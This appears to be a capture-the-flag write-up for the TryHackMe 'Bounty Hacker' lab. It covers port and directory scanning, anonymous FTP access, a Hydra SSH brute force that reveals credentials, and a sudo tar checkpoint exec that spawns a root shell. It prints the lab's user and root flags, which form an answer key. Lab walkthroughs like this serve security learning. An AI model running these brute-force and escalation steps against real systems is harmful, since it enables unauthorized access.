BOUNTY HACKER.




SCANNING: PORTS.
Quick port scan with service version:
nmap -sS -T4 -sV 10.10.114.39
OUTPUT:
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel



RECON: VISITING THE HTTP SITE.
There seems to be no useful info. Just a simple introduction to the room.
However, we will try and list directories in case something interesting shows up.




SCANNING: DIRECTORIES.
Gobuster directory scan:
gobuster dir -u http://10.10.253.43 -w /usr/share/wordlists/dirb/common.txt
OUTPUT:
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/images               (Status: 301) [Size: 313] [--> http://10.10.114.39/images/]
/index.html           (Status: 200) [Size: 969]
/server-status        (Status: 403) [Size: 277]
Note:
Nothing useful. Images just shows the image used on /index.html (landing page).


Gobuster file scan:
gobuster dir -u http://10.10.114.39 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -x php,txt,bak,zip
OUTPUT:
/index.html           (Status: 200) [Size: 969]
/.htaccess.txt        (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htaccess.bak        (Status: 403) [Size: 277]
/.htaccess.zip        (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.                    (Status: 200) [Size: 969]
/.html.zip            (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/.html.bak            (Status: 403) [Size: 277]
/.html.txt            (Status: 403) [Size: 277]
/.html.php            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htpasswd.zip        (Status: 403) [Size: 277]
/.htpasswd.bak        (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/.htpasswd.txt        (Status: 403) [Size: 277]
/.htm.txt             (Status: 403) [Size: 277]
/.htm.php             (Status: 403) [Size: 277]
/.htm                 (Status: 403) [Size: 277]
/.htm.bak             (Status: 403) [Size: 277]
/.htm.zip             (Status: 403) [Size: 277]
/.htpasswds.zip       (Status: 403) [Size: 277]
/.htpasswds.bak       (Status: 403) [Size: 277]
/.htpasswds           (Status: 403) [Size: 277]
/.htpasswds.php       (Status: 403) [Size: 277]
/.htpasswds.txt       (Status: 403) [Size: 277]
/.htgroup.bak         (Status: 403) [Size: 277]
/.htgroup.php         (Status: 403) [Size: 277]
/.htgroup             (Status: 403) [Size: 277]
/.htgroup.txt         (Status: 403) [Size: 277]
/.htgroup.zip         (Status: 403) [Size: 277]
/.htaccess.bak        (Status: 403) [Size: 277]
/.htaccess.bak.bak    (Status: 403) [Size: 277]
/.htaccess.bak.zip    (Status: 403) [Size: 277]
/.htaccess.bak.php    (Status: 403) [Size: 277]
/.htaccess.bak.txt    (Status: 403) [Size: 277]
/.htuser.txt          (Status: 403) [Size: 277]
/.htuser.bak          (Status: 403) [Size: 277]
/.htuser              (Status: 403) [Size: 277]
/.htuser.php          (Status: 403) [Size: 277]
/.htuser.zip          (Status: 403) [Size: 277]
/.ht                  (Status: 403) [Size: 277]
/.ht.txt              (Status: 403) [Size: 277]
/.ht.bak              (Status: 403) [Size: 277]
/.ht.zip              (Status: 403) [Size: 277]
/.htc                 (Status: 403) [Size: 277]
/.ht.php              (Status: 403) [Size: 277]
/.htc.zip             (Status: 403) [Size: 277]
/.htc.php             (Status: 403) [Size: 277]
/.htc.txt             (Status: 403) [Size: 277]
/.htc.bak             (Status: 403) [Size: 277]
Progress: 85645 / 85650 (99.99%)
Note:
No directory is of use. We will move on and check out the ftp port.




EXPLORING FTP SERVICE:
Connecting:
ftp 10.10.114.39


Log in as anonymous (since a prompt indicates ftp server is anon only):
anonymous


Listing directory:
ls
OUTPUT:
229 Entering Extended Passive Mode (|||34172|)
Note:
We need to toggle passive off.


Toggling passive:
passive


OUTPUT:
Passive mode: off; fallback to active mode: off.
Now we can list. OUTPUT:
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.


Note:
Both files look interesting, so we will download them both.
Download:
mget *
Note:
prompt will be as follows: mget locks.txt [anpqy?]?. We hit a, since a = download all remaining files without asking again.


Checking out task:
cat task.txt
OUTPUT:
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin


Checking out locks:
cat locks.txt
OUTPUT: 
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
Note:
It looks like a bunch of passwords. We will try to bruteforce ssh manufacturing a user list, and using hydra.




SSH BRUTEFORCING: HYDRA.
Create txt with mentioned people. Content:
Spike
spike
Jet
jet
Ed
ed	
Faye
faye
Lin
lin
Vicious
vicious
RedEye
Redeye
redeye


Note:
We made the user list. We need to use the locks file as passwordlist.
Hydra ssh bruteforce command:
hydra -l bounty_users.txt -P locks.txt 10.10.114.39 ssh
OUTPUT:
1 of 1 target completed, 0 valid password found




Note:
It looks like we used a wrong command. Thm question format insinuates that locks might be users, not passwords.
SSH BRUTEFORCING 2: HYDRA:
Proper command this time around:
hydra -l locks.txt -P ~/thm/rockyou.txt 10.10.114.39 ssh
Note:
Hydra is taking too long. It must be wrong.




SSH BRUTEFORCING 3: HYDRA:
Note:
It was even simpler. User must be lin, name shown in task file, and password file must be locks. Therefore:
hydra -l lin  -P locks.txt 10.10.114.39 ssh
OUTPUT:
[22][ssh] host: 10.10.114.39   login: lin   password: RedDr4gonSynd1cat3




SSH INTO BRUTEFORCED USER AND RECON.
Ssh connection:
ssh -p 22 lin@10.10.246.181


List directory (currently: ~/Desktop):
ls
OUTPUT:
user.txt

cat requested file. OUTPUT:
THM{CR1M3_SyNd1C4T3}




PRIVESC (to gain access to root.txt):
Check lin's root rights:
sudo -l
OUTPUT:
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
Note:
Great, tar can be used to privesc.


Spawning root shell through tar:
sudo /bin/tar -cf /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh /etc/passwd
Command explanation:
-c: creates an archive
tar requires a file to write to, so -f /dev/null: sets null so no file is actually created.
--checkpoint - 1: This tells tar to trigger a "checkpoint" after processing 1 record (usually a block of data). A checkpoint is just a point during tar's operation where it can execute extra actions.
--checkpoint-action=exec=/bin/sh: tells tar to run /bin/sh when at checkpoint (which will be done, since tar is executed as root).


Find flag (skipping errors in output):
find / -name root.txt 2>/dev/null
OUTPUT:
/root/root.txt

Catting the flag. OUTPUT:
THM{80UN7Y_h4cK3r}
